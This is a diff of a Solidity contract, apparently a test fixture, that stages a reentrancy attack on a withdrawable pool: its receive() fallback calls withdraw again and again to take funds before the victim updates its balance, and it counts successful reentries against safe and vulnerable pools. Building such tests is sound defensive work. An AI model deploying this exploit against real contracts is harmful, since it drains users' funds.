@@ -1,29 +1,39 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-import "./ReentrancyVulnerableLoan.sol";
+interface IWithdrawablePool {
+    function contribute() external payable;
+    function withdraw(uint256 amount) external;
+}
 
 /// @title ReentrancyAttacker
-/// @notice A malicious contract designed to exploit the ReentrancyVulnerableLoan contract.
-/// @dev Uses a fallback function to recursively call withdraw().
+/// @notice Test attacker used unchanged against the safe and vulnerable pools.
 contract ReentrancyAttacker {
-    ReentrancyVulnerableLoan public immutable victim;
+    IWithdrawablePool public immutable victim;
+    uint256 public withdrawalAmount;
+    uint256 public successfulReentries;
 
     constructor(address victimAddress) {
-        victim = ReentrancyVulnerableLoan(victimAddress);
+        victim = IWithdrawablePool(victimAddress);
     }
 
     /// @notice Initiates the attack by depositing funds and immediately withdrawing them.
     function attack() external payable {
-        victim.deposit{value: msg.value}();
-        victim.withdraw();
+        withdrawalAmount = msg.value;
+        victim.contribute{value: msg.value}();
+        victim.withdraw(msg.value);
     }
 
     /// @notice Fallback function triggered when the victim contract sends Ether.
     /// @dev Recursively calls withdraw() before the victim can update its balance state.
     receive() external payable {
-        if (address(victim).balance > 0) {
-            victim.withdraw();
+        if (withdrawalAmount > 0 && address(victim).balance >= withdrawalAmount) {
+            // A protected pool rejects the recursive withdrawal. Catch that
+            // failure so the initial legitimate withdrawal can still complete.
+            (bool success, ) = address(victim).call(
+                abi.encodeCall(IWithdrawablePool.withdraw, (withdrawalAmount))
+            );
+            if (success) successfulReentries += 1;
         }
     }
 }
